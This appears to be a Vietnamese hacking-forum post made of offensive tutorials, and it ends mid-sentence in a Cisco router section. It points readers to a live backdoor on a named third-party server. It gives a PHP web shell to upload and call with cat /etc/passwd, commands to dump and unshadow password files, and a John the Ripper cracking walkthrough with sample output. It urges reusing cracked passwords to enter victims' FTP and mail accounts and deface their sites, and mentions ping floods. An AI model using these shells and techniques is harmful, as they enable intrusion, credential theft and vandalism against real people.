			<span class="postbody">Tác giả: (Someone) ????<br/><br/> HACK LINUX<br/> Cơ bản Hack Linux<br/><br/> Chào các bạn ! Hôm nay mình xin giới thiệu với các bạn đôi chút cơ bản về server chạy Linux .<br/> Để tiện phục vụ bài học mình xin lấy luôn một server để các bác thực hành .<br/><br/><span class="link"> http://www.4me.ru/kozar/remview.php</span><br/><br/> Site này đã được gắn 1 con Backdoor các bạn có thể xem được toàn bộ dữ liệu của server bằng cách click đến nơi mà mình muốn . Backdoor này có tác dụng mạnh hơn cả NTDADDY.ASP đối với NT .<br/><br/> Bắt đầu nha :<br/><br/> Mình xin giới thiệu sơ luợc qua một vài thư mục quan trọng trên server :<br/> /home : nơi lưu giữ các file người sử dụng(VD : người đăng nhập hệ thống có tên là Micro thì sẽ có 1 thư mục là /home/Micro)<br/> /bin : Các lệnh Unix cơ bản cần thiết như ls chẳng hạn .<br/> /usr/bin : các lệnh khác , các lệnh dùng bởi người sử dụng đặc biệt và dùng quản trị hệ thống .<br/> /bot : Nơi mà kernel và các file khác được dùng khi khởi động .<br/> /ect : Các file hoạt động phụ mạng , NFS (Network File System ) Thư tín ( Đây là nơi mà chúng ta cần khai thác nhiều nhất )<br/> /var : Các file quản trị như file bản ghi được các thiết bị sử dụng .<br/> /usr/lib : Các thư viện chuẩn như libc.a<br/> /usr/src : Vị trí nguồn của các chương trình .<br/><br/> OK ! Bây giờ mình chuyển sang vấn đề mật khẩu :<br/><br/> Mọi account trên hệ thống đều có một mục nhập file /ect/passwd ( Các bạn có thể dùng chức năng của backdỏo để xem nội dung file này )<br/> Mỗi mục nhập file passwd có định dạng sau :<br/> username:password:uid:gid:geos:homedir:shell<br/><br/> Ví dụ : root:*:0:1:System PRIVILEGED Account,,,:/:/bin/csh<br/><br/> Đây gọi là trường password .<br/> Username: Tên người sử dụng<br/> Password: Pass của nguời dùng<br/> UserID: Số nhận diện người dùng<br/> GroupID: Số nhận diện nhóm<br/> Geos : vài thông tin về ngườ sử dụng<br/> Home Direcoty: Thư mục ngườ đăng nhấp<br/> Shell : nơi mà chứa lệnh shell cho người s%<br/><br/><span class="link"> http://www.4me.ru/kozar/remview.php</span><br/><br/> Thường thì password bị mã hoá , nhưng ta có thể dùng 1 số chương trình Crack đựơc ( Tôi sẽ hướng dẫn Crack vào phần sau ) Vì vậy ngừơi ta đã khắc phục bằng cách nghĩ ra mật khẩu bóng (Shadow password ) . Khi mật khẩu bóng được dùng , trừơng mật khẩu trong /ect/passwd chỉ chứa 1 dấu X hoặc 1 dấu * mà không bao giờ xuất hiện trong phiên bản mật mật khẩu dã được mã hoá . Thay vào dó người ta dùng file thứ 2 có tên gọi Shadow ( /ect/shadow )<br/> File này chứa các mục nhập mà thoạt nhìn rất giống với mục nhập trong /ect/passwd , nhung chứa mật khẩu thực được mã hoá trong trường mật khẩu .<br/> Chỉ có thể đọc được shadow bằng gốc . Trong truờng password của Shadow chỉ có username và password là có thật bị mã hóa còn các phần khác là không có thực hoặc bỏ trống .<br/><br/> Đây là vị trí của file password của 1 số phiên bản khác nhau :<br/> Version Path Token<br/> -----------------------------------------------------------------<br/> AIX 3 /etc/security/passwd !<br/> /tcb/auth/files//<br/> A/UX 3.0s /tcb/files/auth/?/*<br/> BSD4.3-Ren /etc/master.passwd *<br/> ConvexOS 10 /etc/shadpw *<br/> ConvexOS 11 /etc/shadow *<br/> DG/UX /etc/tcb/aa/user/ *<br/> EP/IX /etc/shadow x<br/> HP-UX /.secure/etc/passwd *<br/> IRIX 5 /etc/shadow x<br/> Linux 1.1 /etc/shadow *<br/> OSF/1 /etc/passwd[.dir|.pag] *<br/> SCO Unix #.2.x /tcb/auth/files//<br/> SunOS4.1+c2 /etc/security/passwd.adjunct ##username<br/> SunOS 5.0 /etc/shadow<br/><br/> System V Release 4.0 /etc/shadow x<br/> System V Release 4.2 /etc/security/* database<br/> Ultrix 4 /etc/auth[.dir|.pag] *<br/> UNICOS /etc/udb *<br/><br/> File nhóm ( ect/group )<br/> Hầu hết các Hacker không quan tâm đến file này nhung tôi thấy cần phải nói vì nó cung quan trong .<br/> Ðịnh dạng của file này là :<br/> Groupname:password:gid:member<br/><br/> VD: lbin:*:1:root,daemon<br/> tên nhóm là : lbin<br/> pass : * ( o tồn tại --&gt; nó nằm trong Shadow )<br/> 1 : số nhóm 1 (nhóm o là root )<br/> người được sử dụng là : root , daemon<br/><br/> Trường password của file group đôi khi khá kỳ lạ. nó không được sử dụng nhiều ,nhưng khi kết hợp với trình newgrp , nó cho phép những người sử dụng không phải là thành viên của 1 nhóm có thể có thừa nhận định danh . ( Mình sẽ nói đến phần sau )<br/><br/> Trong khi sử dụng Backdoor để khai thác hệ thống bạn sẽ gặp 1 số lỗi xảy ra như acces denied hoặc permission denied . Ðây là lỗi khi bạn dùng chức nang xem 1 thu mục hoặc 1 file đã bị ấn định quyền sở hữu và hạn chế khả năng truy cập . Vậy phải làm sao , chắc bạn cũng đã nghe nói đến LEO THANG ÐẶC QUYỀN chứ . OK chúng ta sẽ làm đựơc mọi thứ nếu chúng ta nằm ở vị trí ROOT .<br/><br/> Nhung trứơc tiên chúng ta sẽ tìm hiểu về giới hạn sử dụng file .<br/> Giới hạn sử dụng là cách thức dùng file mà ngườ sử dụng có thể thực hiện được trong Unix . Có 3 giớ hạn sử dụng :<br/> +Cho phép đọc ( Read ): bạn có thể xem nội dung file<br/> +cho phép sửa đổi (Write) : Bạn có thể thay đổi hoặc xoá file .<br/> +Cho phép thi hành (Excute) : Nghia là bạn là b?n có thể chạy file nhu 1 truong trình ( Bạn chú ý cái này cho phép ta run Backdoor trên server )<br/><br/> Mình lấy ví dụ : Các bạn thử dùng chức năng info của Backdoor đối với 1 file trên server xem sao :<br/> ban sẽ thấy :<br/> -rwx r-x r-x<br/><br/> Dấu ghạch ngang đầu (-) kí hiệu là đây là 1 file<br/> 3 ký tiếp theo (rwx) : nói lên chủ sở hữu có thể được ,ghi và thi hành )<br/> tiếp theo : r-x : nói lên nhóm có thể đọc và thi hành<br/> ti?p theo : r-x : những nguời khác có thể đọc và thi hành .<br/> nói chung nó la ký hiêu của Read-Write-Excute .<br/> Có thể hiểu trong từng mức có 3 bit tuong ứng với giới hạn sử dụng ( Các bạn còn nhớ cách Chmod file để làm Forum chứ , đấy đấy chính nó )<br/><br/> Lần sau mình sẽ hướng dẫn cách Crack file password bằng Jonh , và các lệnh để xâm nhập vào server , và thực hiện các lệnh trên server .<br/> Dần dần bạn sẽ học được cách Hack 1 cách chuyên nghiệp hơn thông qua FPT , TFTP , PHF , RPC , NIS , Senmail , WU-FTP Server , BIND .<br/><br/> 1 lời khuyên : không có gì hay hơn là bạn nên cài thử Linux xem sao . OK<br/><br/> Ngoài chương trình trên ra, ta còn có thể tự viết một đoạn PHP như sau :<br/> &lt;?<br/> $output = `$cmd`;<br/> echo $output;<br/> ?&gt;Ví dụ : Sau đó lưu đoạn mã này với tên là hack.php. Khi upload lên, ta thực hiện lệnh như sau :<br/> www.tentrangweb.com/hack.php?cmd=cat+/etc/passwd<br/> ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~<br/> Hướng dẫn bẻ mật khẩu của Unix bằng John The Ripper :<br/><br/><br/><br/> --------------------------------------------------------------------------------<br/><br/> Lấy file passwd<br/> Crack file passwd<br/> Single crack<br/> Crack bằng wordlist (+rules)<br/> Incremental crack<br/> External crack<br/> Sử dụng các passwd đã bị crack<br/><br/> --------------------------------------------------------------------------------<br/><br/> I. Lấy file passwd<br/><br/> Bạn có thể khai thác một lỗ hỏng bảo mật trên server, chẳng hạn như chỗ yếu cgi hoặc lỗi tràn bộ đệm, ... sau đó get file /etc/passwd & /etc/shadow<br/><br/> TH1: nếu passwd chưa bị shadow<br/> cat /etc/passwd &gt; password.txt<br/><br/> * nếu server đang chạy NFS, bạn phải dùng ypcat(yellow pages cat) & grep -s thay cho cat:<br/> ypcat /etc/passwd | grep s &gt; password.txt<br/><br/> TH2: nếu passwd đã bị shadow, bạn phải cat cả file /etc/passwd & /etc/shadow, sau đó unshadow cho passwd:<br/> cat /etc/passwd<br/> cat /etc/shadow<br/> unshadow passwd shadow &gt; password.txt<br/><br/><br/> --------------------------------------------------------------------------------<br/><br/> II. Crack file passwd<br/><br/> Trước khi crack file passwd, tôi muốn giới thiệu sơ lược cho bạn về format của file passwd. Đây là một file text chứa các thông tin về user trên server. Mỗi dòng trong file này có dạng như sau:<br/><br/> LWait:0m8Car45jNxHQ:1000:2000:John Doe:/home/litewait:/bin/csh<br/><br/> LWait login name<br/> 0m8Car45jNxHQ encrypted passwd<br/> 1000 user id<br/> 2000 group id<br/> John Doe real name<br/> /home/litewait home dir<br/> /bin/csh shell<br/><br/> * encrypted passwd=="*" -&gt; account này đã bị vô hiệu, đừng mất công để crack passwd của account này!<br/> * encrypted passwd=="+" -&gt; passwd đã bị shadow, bạn phải unshadow trước khi crack<br/><br/> Ok, bây giờ chúng ta sẽ crack file password.txt! Có 4 cách để crack passwd:<br/><br/> 1. Single crack<br/><br/> - được dùng để crack các weak passwd<br/><br/> C:\john&gt;john -single password.txt<br/> Loaded 585 passwords with 128 different salts (Standard DES [24/32k])<br/> thomas (mrice)<br/> guesses: 1 time: 0:00:00:44 29% c/s: 86654 trying: bja$on - m4ry4nnr<br/> guesses: 1 time: 0:00:06:27 100% c/s: 33653 trying: aamy1961 - bamy1969<br/><br/> ( password.txt: file passwd cần crack)<br/><br/> JTR vừa crack được 1 passwd "thomas" của username "mrice"(passwd luôn đứng trước username). JTR cũng đang đoán các passwd từ bja$on -&gt; m4ry4nnr. 1961, 1969? "Rất có thể có năm sinh của user trong passwd", JTR nghĩ vậy đó;)<br/><br/><br/> --------------------------------------------------------------------------------<br/><br/> 2. Crack bằng wordlist (+ rules)<br/><br/> - JTR đã có sẵn file wordlist "password.lst"! Bạn không cần phải thêm vào những từ đại loại như "tEST", "Test", ... Chỉ cần một từ "test" trong file wordlist là đủ. Khi crack bằng wordlist có dùng thêm rules, JTR sẽ tự động dùng thêm "tEST", "Test", ..., "test123", ... để đoán passwd!<br/><br/> C:\john&gt;john password.txt -w:password.lst -rules<br/> Loaded 584 passwords with 128 different salts (Standard DES [24/32 4K])<br/> julianne (thutchcr)<br/> mizzou (slymer)<br/> hal9000 (csalzman)<br/> hammer (preardon)<br/> scoobydo (sfuemmel)<br/> mylord (gdessieu)<br/> scoobydo (jreynold)<br/> guesses: 7 time: 0:00:00:46 100% c/s: 100468 trying: owl - 0wl<br/><br/> (-w:&lt;file wordlist&gt;)<br/><br/> JTR vừa đoán được 8 passwd!<br/><br/> * Cách đặt luật cho JTR: để đặt luật cho chế độ crack bằng wordlist, bạn hãy hiệu chỉnh phần "List.Rules:Wordlist" trong file cấu hình của JTR, "john.ini"<br/><br/> # Wordlist mode rules<br/> [List.Rules:Wordlist]<br/><br/> (tất cả các dòng bắt đầu bằng dấu # trong file john.ini được coi là các dòng chú thích)<br/><br/> Xem các ví dụ sau sẽ rõ về cách đặt luật cho JTR!<br/> &gt;4&lt;7<br/> chỉ chọn các từ có chiều dài &gt;4 && &lt;7 kí tự, tức là dài 5-&gt;6 kí tự<br/> &gt;5&lt;7lc<br/> chỉ kiểm tra các từ dài 6 kí tự, sau đó viết thường(lowercase) & viết hoa kí tự đầu tiên(capital), aBcDeF -&gt; Abcdef<br/><br/> l&lt;9/ese3<br/> lowercase và swap 'e' thành '3'; loại bỏ các từ không chứa 'e' hoặc dài hơn 8 kí tự, tesT -&gt; t3st<br/> &gt;2&lt;4/isi1<br/> lowercase và swap 'i' thành '1'; loại bỏ các từ không chứa 'i' hoặc không dài đúng 3 kí tự<br/><br/> l&lt;8/isi1^[0-9]<br/> lowercase, swap 'i' thành '1' và thêm 0-9 vào đầu; loại bỏ các từ không chứa 'i' hoặc dài quá 7 kí tự, Vicki -&gt; 0v1ck1, 1v1ck1, 2v1ck1, ..., 9v1ck1<br/><br/> '7/ese3/isi1$[0-9]<br/> xén bớt các kí tự bên phải của các từ dài hơn 8 kí tự, swap 'e' thành 3 và 'i' thành '1', sau đó thêm 0-9 vào cuối; loại bỏ các từ không chứa 'i' & 'e', zhaowei-ww -&gt; zhaow310, zhaow311, ..., zhaow319<br/> &gt;4&lt;6T1^[0-9]^[0-9]<br/> từ phải dài 5 kí tự, đổi kiểu chữ của kí tự thứ 2(ở vị trí 1), sau đó thêm 0-9, 0-9(hai số sau của năm sinh) vào đầu, vIcki -&gt; 00vicki, 10vicki, ..., 99vicki<br/><br/> '7T0$[aeiou0-9]<br/> xén bớt các kí tự bên phải của các từ dài hơn 8 kí tự, đổi kiểu chữ của kí tự thứ 1(ở vị trí 0), sau đó thêm các nguyên âm hoặc 0-9 vào sau, zhaowei1976 -&gt; Zhaoweia, Zhaoweie, ... Zhaowei0, ..., Zhaowei9<br/><br/> i0[v]i3[k]<br/> chèn 'v' vào vị trí 0 và 'k' vào vị trí 3, ici -&gt; vicki<br/><br/> o4[123]<br/> ghi đè lên kí tự thứ 5(ở vị trí 4) bằng '1', '2' hoặc '3', zhaowei -&gt; zhao1ei, zhao2ei, zhao3ei<br/><br/> =0?d$7<br/> bỏ qua các từ không bắt đầu bằng 1 digit, thêm 7 vào sau, 7vicki -&gt; 7vicki7<br/> @?w<br/> xoá bỏ các kí tự trắng, zhao wei -&gt; zhaowei<br/><br/> %2i<br/> chỉ chọn các từ có 2 chữ 'i' trở lên, vicki -&gt; vicki<br/><br/> Bạn có thể tìm thấy nhiều ví dụ khác trong file john.ini và tài liệu đi kèm của JTR. Nếu bạn muốn xem output của các luật mà bạn đã đặt, hãy nhập vào:<br/><br/> john -w:wordfile.dic -rules -stdout &gt; output.file<br/><br/><br/> --------------------------------------------------------------------------------<br/><br/> 3. Incremental crack<br/><br/> - chế độ này cho phép bạn đoán tất cả các khả năng của passwd. Bạn dùng tùy chọn -i:&lt;mode&gt; như sau:<br/><br/> john password.txt -i:all<br/> thử hết mọi khả năng<br/><br/> john password.txt -i:alpha<br/> passwd chỉ gồm các kí tự alpha(a-z)<br/><br/> john password.txt -i:digits<br/> passwd chỉ gồm các kí tự số(0-9)<br/><br/> Để cấu hình cho chế độ "Incremental", bạn hãy hiệu chỉnh phần "Incremental" trong file john.ini<br/><br/> [Incremental:All]<br/> File = ~/all.chr<br/> MinLen = 0<br/> MaxLen = 8<br/> CharCount = 95<br/><br/> [Incremental:Alpha]<br/> File = ~/alpha.chr<br/> MinLen = 1<br/> MaxLen = 8<br/> CharCount = 26<br/><br/> [Incremental:Digits]<br/> File = ~/digits.chr<br/> MinLen = 1<br/> MaxLen = 8<br/> CharCount = 10<br/><br/> * Ngoài các tập kí tự mặc định all.chr, alpha.chr, digits.chr, ..., bạn có thể xây dựng cho mình một tập kí tự riêng để dùng trong chế độ crack "Incremental". Ở đây, tôi làm thử một ví dụ cho bạn thấy!<br/><br/> Đầu tiên, chúng ta cần backup file john.pot. File này chứa các passwd vừa bị crack!<br/><br/> copy john.pot john.bak<br/> del john.pot<br/><br/> Giờ thì bạn mở Notepad, tạo file john.pot mới với nội dung như sau:<br/><br/> :betyouca<br/> :ng351<br/><br/> Lưu ý, mỗi dòng trong file john.pot phải bắt đầu bằng một dấu ":", tiếp theo là các kí tự. Chiều dài tối đa của các kí tự trên một dòng(trừ dấu ":") là 8, tương ứng với maxlength của unix plaintext passwd!<br/><br/> Lưu file john.pot và chạy JTR:<br/><br/> C:\john&gt;john -make:betyou.chr<br/> Loaded 2 plaintexts<br/> Generating cracking order... DONE<br/> Successfully written charset file: betyou.chr (13 characters)<br/><br/> Chúng ta vừa tạo xong file tập kí tự có tên là betyour.chr. Bây giờ bạn hãy hiệu chỉnh file john.ini, đến phần "Incremental" và thêm vào các dòng sau:<br/><br/> [Incremental:betyou]<br/> File = ~/betyou.chr<br/> MinLen = 3<br/> MaxLen = 7<br/> CharCount = 13<br/><br/> File=~/betyou.chr(file tập kí tự, ~/ == home dir)<br/> MinLen=3 & MaxLen=7 -&gt; JTR chỉ đoán các passwd có chiều dài từ 3-&gt;7 kí tự<br/> CharCount=13 -&gt; số kí tự có trong tập kí tự này, đây là số mà thấy khi tạo file betyou.chr ở trước. Nếu bạn gán CharCount=100, JTR sẽ báo lỗi "chỉ có thể load được x kí tự". Hãy thay thế 100 bằng x<br/><br/> Đến đây, chúng ta có thể sử dụng tập kí tự mới để crack passwd. Bạn hãy nhập vào:<br/><br/> john password.txt -i:betyou<br/><br/><br/> --------------------------------------------------------------------------------<br/><br/> 4. External crack<br/><br/> JTR còn cho phép bạn lập trình để crack passwd. Cú pháp lệnh y chang như của C vậy. Bạn hãy xem ví dụ sau, nó có nhiệm vụ lọc các từ có chứa kí tự alpha(a-z).<br/><br/> [List.External:Filter_Alpha]<br/> void filter()<br/> {<br/> int i, c;<br/><br/> i = 0;<br/> while (c = word[i++])<br/> if (c &lt; 'a' || c &gt; 'z') {<br/> word = 0; return;<br/> }<br/> }<br/><br/> Chi tiết về chế độ crack này, bạn xem thêm trong tài liệu hướng dẫn đi kèm của JTR!<br/><br/><br/> --------------------------------------------------------------------------------<br/><br/> Tôi muốn nói thêm với các bạn một số vấn đề khác có liên quan khi crack passwd bằng JTR!<br/><br/> - nếu bạn chỉ muốn crack các user hoặc group cụ thể nào đó, hãy dùng tùy chọn -user hoặc -group(xem ví dụ sau)<br/><br/> john password.txt -user:LWait<br/> chỉ crack passwd của user "LWait"<br/><br/> john password.txt -group:123 -i:custom<br/> chỉ crack passwd của các user trong group có ID là 123<br/><br/> - crack passwd là một công việc tốn khá nhiều thời gian, có khi phải lên đến mấy ngày trời mới crack được vài passwd. Để tạm dừng tiến trình crack hiện tại, bạn hãy ấn Ctrl-C. Khi nào rãnh, bạn có thể restore lại tiến trình bằng cách gõ vào:<br/><br/> john -restore<br/><br/> - nếu bạn muốn crack nhiều file passwd cùng một lúc, bạn có thể sử dụng tùy chọn -session để làm việc đa phiên:<br/><br/> john session:zebpasses<br/><br/> Để restore lại session zebpasses, hãy nhập vào:<br/><br/> john -restore:zebpasses<br/><br/> Nếu bạn cần xem tiến độ crack của session này, hãy nhập vào:<br/><br/> john -status:zebpasses<br/><br/> Hoặc nếu bạn muốn biết JTR đã crack được bao nhiêu passwd trong file password.txt, hãy nhập vào:<br/><br/> john -show password.txt<br/><br/> - trong khi crack, bạn có thể bấm phím space để xem tiến độ crack. Nếu bạn thích JTR kêu bíp một cái khi vừa crack xong một passwd, hãy hiểu chỉnh phần "Options" trong file john.ini như sau:<br/><br/> [Options]<br/> ...<br/> Beep = Y<br/> ...<br/><br/> - Bạn có muốn tăng tốc cho tiến trình crack không? Đừng nên mở nhiều chương trình khác khi đang chạy JTR. Nếu bạn đang chạy JTR trên Windows, hãy thay thế file john.exe bằng file mới trong file john-mmx.zip nếu chip CPU của bạn là Pentium hoặc trong file john-k6.zip nếu bạn đang dùng chip của AMD. Nếu bạn đang xài Linux, hãy tận dụng ngay sức mạnh của Linux. JTR phá passwd khá nhanh trên Linux;)<br/><br/><br/> --------------------------------------------------------------------------------<br/><br/> III. Sử dụng các passwd đã bị crack<br/><br/> Nhiều người thường sử dụng y chang một passwd để login telnet, ftp hay pop3(mail). Vì vậy, bạn có thể thử passwd này để login vào ftp account của họ, thay đổi trang web của họ hay để lại vài lời nhắn trong mailbox của họ!<br/><br/> Chúc bạn thành công!<br/> ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~<br/> Hack vào hệ thống CisCo của Linux :<br/><br/><br/><br/><br/> Hệ thống Cisco được chạy trên server Unix . Nó là 1 hệ thống truyền thông tin theo kiểu những gói dữ liệu , vì vậy khi bạn sẽ ngạc nhiên khi làm sao ta có thể nắm bắt được những tín hiệu của cisco . Thường thì các hệ thống Cisco rất quan trong , nên khi ta hack được vào 1 hệ thống cisco ta có thể nắm bắt những thông tin quan trong của khách hàng , hay thông tin về thẻ tín dụng . Vì vậy các bạn nên chú ý đến tác hại của nó .<br/><br/><br/> Yêu cầu trong bài này các bạn phải biết được những định nghĩa sau :<br/><br/> - Thế nào là 1 địa chỉ IP<br/><br/> - Thế nào là 1 ISP<br/><br/> - Thế nào là 1 TCP/IP packet<br/><br/> - Cách biến đổi IP của bạn<br/><br/> - Cách sử dụng Telnet<br/><br/> - Cách sử dụng Hyper Terminal<br/><br/> - Cách sử dụng Ping<br/><br/> - Cách sử dụng TraceRoute<br/><br/> - Cách sử dụng 1 proxy server<br/><br/><br/> Những kiến thức trên đối với các Hacker thì quá quen thuộc rồi , nhưng đối với những newbie thì có lẽ cũng hơi lơ mơ có phải không .<br/><br/><br/> Vậy thì mình cũng xin giới thiệu qua một chút nha :<br/><br/><br/> 1 - IP là gì ?<br/><br/><br/> IP có thể được coi là 1 địa chỉ của 1 máy tính khi được kết nối vào Internet . Nó được các nhà phục vụ mạng ( ISP) gán cho máy tính cá nhân của bạn khi bạn kết nối đến nhà cung cấp dịch vụ .<br/><br/> Có 2 loại IP : đó là IP tĩnh và IP động . thường các bạn nối net bằng PC cá nhân thì là IP động . Còn IP của những server cung cấp Hosting hay Domain trên mạng có IP tĩnh .<br/><br/> IP động là loai mỗi khi vào mạng bãn sẽ có 1 IP khác nhau<br/><br/> IP tĩnh là loại chỉ có duy nhất 1 IP cho tât cả các loại kết nối tại các thời điểm khác nhau .<br/><br/><br/> IP của ban có thể bị nắm dữ của ngời khác thông qua những cách sau :<br/><br/> - khi bạn truy cập vào 1 website , IP của bạn đã được lưu dữ trong 1 file Log<br/><br/> - Khi ban trên IRC thì bất cứ ai cũng có thể có IP của bạn .<br/><br/> - Khi bạn trên ICQ thì những ngời muốn có IP của bạn thì sẽ lấy được cho dù bạn đã không cho hiển thi IP<br/><br/> - Nếu bạn đang được kết nối với 1 máy tính của ai đó , họ có thể sử dụng lệnh " systat" và xem ai đang được kết nối đến họ<br/><br/> - Nếu bạn gửi một email tới 1 ai đó , thì họ cũng có được IP của bạn .<br/><br/><br/> Còn rất nhiều cách xác định 1 IP của 1 ngời , trong đó còn bao gồm cae những chương trình mở cửa sau nhưSub7 và Netbios .<br/><br/><br/> 2. ISP là gì ?<br/><br/><br/> ISP là 1 nhà cung cấp mạng Internet cho bạn . Bạn có thể kết nối với ISP mọi lúc bàng cách dial-up với số cung cấp dịch vụ của ISP . Bạn có thể nhìn thấy ISP của bạn là gì bằng cách rất đơn giản là chạy 1 Traceroute trên máy bạn . ( Traceroute sẽ được nói ở sau ) Bạn sẽ nhìn thấy những gì bạn muốn .<br/><br/><br/> Vidụ : tracert 222.222.22.22<br/><br/><br/> Tracing route to [221.223.24.54]<br/><br/> over a maximum of 30 hops.<br/><br/> 1 147ms 122ms 132ms your.isp [222.222.22.21]<br/><br/> 2 122ms 143ms 123ms isp.firewall [222.222.22.20]<br/><br/> 3 156ms 142MS 122ms aol.com [207.22.44.33]<br/><br/> 4 * * * Request timed out<br/><br/> 5 101ms 102ms 133ms cisco.router [194.33.44.33]<br/><br/> 6 233ms 143ms 102ms something.ip [111.11.11.11]<br/><br/> 7 222ms 123ms 213ms netcom.com [122.11.21.21]<br/><br/> 8 152ms 211ms 212ms blahblah.tts.net [121.21.21.33]<br/><br/> 9 122ms 223ms 243ms altavista.34.com [121.22.32.43] &lt;&lt;&lt; target's isp<br/><br/> 10 101ms 122ms 132ms 221.223.24.54.altavista.34.com [221.223.24.54]<br/><br/> Trace complete.<br/><br/><br/> -----------------------------------<br/><br/> Nhìn thấy rồi chứ ! OK<br/><br/><br/> 3 . Thế nào là 1 TCP/IP packet ( gói dữ liệu TCP/IP )<br/><br/><br/> TCP/IP có nghĩa là Transmission Control Protocol và Internet Protocol ,<br/><br/> Một TCP/IP packet là 1 khối dữ liệu được nén , và một đầu mục được đặt tên nó và được gửi cho máy tính khác theo chuẩn thức TCP/IP . Đầu mục trong 1 gói chứa đựng IP của máy tính được gửi đi và máy tính được gửi đến làm cho gói dữ liệu đến đúng mục tiêu ngời nhận . Bạn có thể Read-write 1 gói dữ liệu làm cho nó có vẻ đến bất kỳ ai , bạn sẽ thu được tất cả những những kết nối đến hệ thống chủ mà không có điều gì xảy ra .<br/><br/><br/> 4. Cách biến đổi IP ,hoặc không cho phép bắt giữ IP của bạn :<br/><br/><br/> Bạn hãy tìm chương trinh : Genius 2 or DC IS nó sẽ giúp bạn làm điề đó .<br/><br/><br/> 5 . Cách sử dụng Telnet<br/><br/><br/> Rất đơn giản bạn chỉ việc click vao Start menu --&gt; Run ; rồi gõ telnet . Bạn sẽ gọi được chương trình telnet . Bạn có thể vao Terminal&gt;Preferences để thay đổi thông số .<br/><br/> Bạn muốn kết nối tới đâu chỉ việc vào Conect --&gt; Remote System . Rồi đánh Host name cho địa chỉ cần đến . va port . Đối với port : 23 dùng cho telnet , port : 21 dùng cho FTP và port 25 dùng cho dịch vụ sentmail . Có rất nhiều cổng . Sau này nếu bạn là 1 Hacker giỏi bạn có thể gắn Backdoor mở cổng hậu bất kỳ nào mà bạn muốn .<br/><br/><br/><br/> 6 Cách sử dụng HyperTerminal<br/><br/><br/><br/> HyperTerminal cho phép bạn mở một server trên bất kỳ port nào của máy tính , và cho phép lăng nghe những thông tin đầu vào từ những máy tính xác định .<br/><br/> Bạn muốn thiết lập nó hãy vào : Start&gt;Programs&gt;Accessories&gt;Communications&gt;HyperTerminal<br/><br/><br/> trước hết bạn cần lựa chọn kết nối , bạn chon "TCP/IP Winsock" , và cần chon 1 cổng bất kỳ trên máy tính , mình sẽ chọn cổng 23 chẳng hạn , Sau đó các bạn thiết lập chế độ Call&gt;Wait for Call<br/><br/><br/> OK ! bây giờ các máy tính khác có thể nối với máy tính bạn trên cổng đó và có thể chia sẻ với nhau những dữ liêu .<br/><br/><br/> 7 . Cách sử dụng lệnh ping<br/><br/><br/> Lệnh Ping giúp cho ta biết thông tin về IP hay address mà chúng ta quan tâm .<br/><br/> Ban chỉ cần mở cửa sổ MS-DOs prompt rồi gõ :<br/><br/><br/> ping diachitrangweb.com<br/><br/><br/> hoăc:<br/><br/><br/> ping ip.máytínhbạnmuốntấncông.<br/><br/><br/> Liệu lệnh Ping có tác hại gì không , chắc chắn tôi sẽ nhận được 1 câu trả lời rằng không . Nhầm rồi các bạn ạ . 1 hệ thống có thể bị Crash nếu ta gửi hàng loạt lệnh ping đến ( Ping floods ) .<br/><br/><br/><br/> 8 .Cách sử dụng TraceRoute<br/><br/><br/> Để đánh dấu tất cả kết nối của bạn , và nhìn thấy tất cả các máy tính có giữa bạn và 1 đích . Bạn chỉ việc mở MS-DOS prompt và gõ :<br/><br/><br/> tracert ip.address(IP của 1 máy tính bất kỳ)<br/><br/><br/> Bạn sẽ nhìn thấy 1 danh sách các máy tính giữa bạn và máy tính đích .<br/><br/> Bạn có thể sử dụng điều này để kiểm tra xem có friewall ngăn cách bất cứ cái gì . Và cũng cho phép bạn ai là ISP ( cung cấp dịch vụ mạng )<br/><br/><br/><br/> 9 . Cách sử dụng một proxy server<br/><br/><br/> Thôi cái này các bạn phải tự biết , Vì nếu mà không biết cách sử dụng Proxy thì đừng đọc bài này làm gì !<br/><br/><br/> Ôi mệt quá ! Học kểu này phải nói hết ra những thứ cơ bản mệt phờ râu !<br/><br/><br/> Bắt đầu Hack nào anh em :<br/><br/><br/><br/> I Cách tìm 1 cisco router ( hệ thống chạy cisco )<br/><br/><br/> Việc tìm thấy một chương trình chuyển vận cisco là một nhiệm vụ khá dễ , gần nhưmỗi ISP sẽ ấn định tuyến đờng xuyên qua ít nhất một chương trình chuyển vận Cisco .<br/><br/> Cách dễ nhất để tìm thấy một chương trình chuyển vận cisco sẽ chạy một traceroute ( Bằng cách mở MS-DOS prompt gõ "tracert" và địa chỉ IP của bất cứ 1 máy tính nào . Xem lại cách sử dụng traceroute ở phần trên ) Khi đó nó sẽ cho ta thấy tât cả những hệ thống máy tính có giữa máy tính của bạn và của máy tính mà ban vua dùng để tracert . Một trong số những hệ thống này có lẽ sẽ có tên " Cisco "<br/><br/><br/> Ví du :<br/><br/><br/> tracert 222.222.22.22<br/><br/><br/> Tracing route to [221.223.24.54]<br/><br/> over a maximum of 30 hops.<br/><br/> 1 147ms 122ms 132ms your.isp [222.222.22.21]<br/><br/> 2 122ms 143ms 123ms isp.firewall [222.222.22.20]<br/><br/> 3 156ms 142MS 122ms aol.com [207.22.44.33]<br/><br/> 4 * * * Request timed out<br/><br/> 5 101ms 102ms 133ms cisco.router [194.33.44.33]<br/><br/> 6 233ms 143ms 102ms something.ip [111.11.11.11]<br/><br/> 7 222ms 123ms 213ms netcom.com [122.11.21.21]<br/><br/> 8 152ms 211ms 212ms blahblah.tts.net [121.21.21.33]<br/><br/> 9 122ms 223ms 243ms altavista.34.com [121.22.32.43] &lt;&lt;&lt; target's isp<br/><br/> 10 101ms 122ms 132ms 221.223.24.54.altavista.34.com [221.223.24.54]<br/><br/> Trace complete.<br/><br/><br/> Bạn nhìn thấy dòng số 5 cha : 5 101ms 102ms 133ms cisco.router [194.33.44.33]<br/><br/><br/> Đây chính là 1 hệ thống chạy Cisco , Bạn hãy ghi nhớ IP của nó là 194.33.44.33 để chúng ta tấn công hê hê ...<br/><br/><br/> II Cách tấn công hệ thống Cisco<br/><br/><br/> Một Cisco routers thường chạy bản V4.1 (mà hầu hết là vậy) . Ta có thể dễ dàng vô hiệu hoá được chúng .<br/><br/><br/> Bắt đầu : Bạn hãy kết nối tới cổng 23 của hệ thống Cisco với IP đã có ở trên . (Chính là Telnet ấy mà , xem lại cách sử dụng ở trên) Nhưng nên nhớ phải thông qua proxy server (cái này tuỳ bạn)<br/><br/> Khi kết nối tới cổng 23 của server chạy Cisco thường thì 